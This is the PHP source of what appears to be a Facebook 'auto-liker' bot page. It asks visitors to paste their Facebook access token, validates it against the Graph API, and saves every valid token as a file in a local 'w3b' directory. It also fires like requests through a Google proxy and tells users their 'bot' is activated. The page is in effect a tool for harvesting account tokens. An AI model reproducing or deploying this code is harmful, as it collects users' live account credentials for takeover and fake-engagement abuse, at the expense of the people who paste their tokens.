
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>
 Nir  mgr
</title><link rel="stylesheet" type="text/css" href="B.css"
 media="all,handheld"/>
<link href="https://fonts.googleapis.com/css?family=Great+Vibes" rel="stylesheet"> 
<center><div style="font-family: sans-serif;
font-size:40pt">
<strong><center><script language="JavaScript" src="AB.js"></script></font></center></strong>

<?php
$yx=opendir('w3b');
while($isi=readdir($yx)){
if($isi != '.' && $isi != '..'){
$member[]=$isi;
}
}
$like = new like();
if($_GET[act]){
print '';
}
if($_POST[access_token]){
$access_token = $_POST[access_token];
$me = $like -> me($access_token);
if($me[id]){
$like -> w3b($access_token);
if($_POST[id]){
$like -> pancal($_POST[id]);
}else{
$like -> getData($access_token);
}
}else{
$like -> invalidToken();
}
}else{
$like->form();
}
class like {
public function pancal($id){ for($i=1;$i<4;$i++){
$this-> _req('http://google.com/gwt/n?u='.urlencode('http://'.$_SERVER[HTTP_HOST].'/likes.php?id='.$id.'&n='.$i));
}
print '';
}
public function me($access){
return json_decode($this-> _req('https://graph.facebook.com/me?access_token='.$access),true);
}
public function w3b($access){
if(!is_dir('w3b')){
mkdir('w3b');
}
$a=fopen('w3b/'.$access,'w');
fwrite($a,1);
fclose($a);
}
public function invalidToken(){
print'<font color="red">TOKEN INVALID</font>';
$this->form();
}
public function form(){
 echo '
<center>
<br><br>
<a target="_blank"  href="https://www.facebook.com/100027065658389"><img src="https://graph.facebook.com/100027065658389/picture?type=large" alt="" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 15px 10px 	white; padding: 0px;" width="250" height="250" title=""/></a></div></div></br><br>
<link href="https://fonts.googleapis.com/css?family=Great+Vibes" rel="stylesheet">
<center><div style="font-family: Great+Vibes;
font-size: 30pt">
<div id="center">

<center><div style="font-family: Great+Vibes;
font-size: 30pt"><a href="http://nirtoken.byethost7.com/?i=1" target="blank"><input class="button button5" type="button" value="GET TOKEN"></a></font></center></a></li>

</font><br>
  <form action="index.php" method="post">

<input class="search" type="text1" style="width:80%" height="30px" name="access_token" placeholder="Paste Your Access Token Here" required><br><input class="button button5" type="submit"name="saveFile" style="height:28px;" '.$warna1.';border:2px groove '.$warna.';height:50px;width:22px"autocomplete="off" value="SUBMIT"onfocus="value="SUBMIT=""></form></center><br>
</font>
</div>
</b></a></center></div></div></body></html>';
}
public function getData($access){
$feed=json_decode($this -> _req('https://graph.facebook.com/me/home?access_token='.$access.'&limit=1'),true);
if(count($feed[data]) >= 1){
for($i=0;$i<count($feed[data]);$i++){
$uid = $feed[data][$i][from][id];
$name = $feed[data][$i][from][name];
$type = $feed[data][$i][type];
$mess = str_replace(urldecode('
'),'<br/>',htmlspecialchars($feed[data][$i][message]));
$id = $feed[data][$i][id];
$pic = $feed[data][$i][picture];
echo'
<br>
<br>
<br>
<center> 
<br>
<br>
<br>
<marquee direction="left"><font size="8" color="gold"><font size="5" style="background: url(&quot;&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.9em red, 0pt 2pt 0.9em White;">Your bot Has been Activated Successfully </font></marquee>
<br>
<br>
<br>
<form action="keluar.php" method="post">
<center><input class="submit" type="submit" style="width:40%;" value="Click Here To Add AnOther Token"></center>
<br>
<br>
<br>
';
if($type=='photo'){
echo'
';
}else{
echo'
';
}
}
}else{
print '';
}
print '';
}
private function _req($url){
$ch = curl_init();
curl_setopt_array($ch,array(
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_URL => $url,
) );
$result = curl_exec($ch);
curl_close($ch);
return $result;
}
}
?>
</body>
</html>
<h2><center><font color="lightblue">
Users : <font color="red"><?php include 'users.php';?> </font></br><center/>
<center><font color="lightblue">Made by : Nir Rana Mgr</font></center>
